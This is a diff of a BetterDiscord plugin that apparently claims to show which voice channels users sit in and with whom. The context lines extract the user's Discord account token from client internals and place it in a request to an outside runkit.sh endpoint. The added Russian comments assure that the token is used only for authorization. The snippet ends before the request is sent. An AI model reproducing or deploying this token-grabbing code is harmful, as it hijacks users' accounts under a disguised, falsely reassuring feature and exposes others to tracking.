@@ -39,7 +39,7 @@ const config = {
                 discord_id: "3713360440224645238",
             }
         ],
-        version: "2.0.4",
+        version: "2.0.5",
         description: "Показывает кто где и скем сидит",
         github: "https://github.com/GR0SST/Gods_eye/blob/main/SelfCommands.plugin.js",
         github_raw: "https://raw.githubusercontent.com/GR0SST/Gods_eye/main/SelfCommands.plugin.js",
@@ -139,7 +139,7 @@ module.exports = !global.ZeresPluginLibrary ? class {
     const { React } = DiscordModules;
     const path = `${BdApi.Plugins.folder}\\mainCode.js`
     let script = null
-    let auth = true
+    let auth = false
 
     const TopBarRef = React.createRef();
 
@@ -148,6 +148,8 @@ module.exports = !global.ZeresPluginLibrary ? class {
             super();
         }
         auth() {
+            // Токен используеться исключительно для авторизации и индетификации пользователя
+            // Никакие данные используя токен не сохраняються и не обрабатываються
             const userToken = Object.values(webpackJsonp.push([[], { ['']: (_, e, r) => { e.cache = r.c } }, [['']]]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
             const options = {
                 url: 'https://da-hzcvrvs0dopl.runkit.sh/selfcmd',
